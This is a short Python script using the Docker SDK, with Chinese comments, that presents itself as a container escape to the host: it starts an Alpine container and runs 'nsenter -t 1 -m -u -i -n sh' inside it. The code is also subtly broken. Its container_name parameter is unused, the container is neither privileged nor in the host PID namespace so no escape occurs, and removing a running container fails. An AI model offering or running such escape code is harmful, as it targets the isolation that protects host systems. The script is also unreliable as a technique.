import docker

def escape_to_host(container_name):
    client = docker.from_env()
    
    # 創建一個新的Docker容器
    container = client.containers.run('alpine', detach=True, tty=True)
    
    # 在容器中執行命令以越獄到主機
    container.exec_run('nsenter -t 1 -m -u -i -n sh')
    
    # 刪除容器
    container.remove()